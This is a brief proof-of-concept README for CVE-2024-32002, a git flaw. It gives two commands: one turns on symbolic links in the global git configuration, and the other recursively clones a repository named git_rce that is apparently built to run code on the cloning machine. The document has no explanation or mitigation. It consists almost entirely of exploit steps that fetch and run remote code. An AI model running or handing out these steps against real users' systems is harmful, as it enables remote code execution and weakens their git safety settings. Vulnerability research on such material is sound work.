# CVE-2024-32002 PoC
1. You must set up the git's symbolic link option like this:
```
git config --global core.symlinks true
```

2. Then exploit CVE-2024-32002 by the following command:
```
git clone --recursive https://github.com/EQSTSeminar/git_rce.git
```
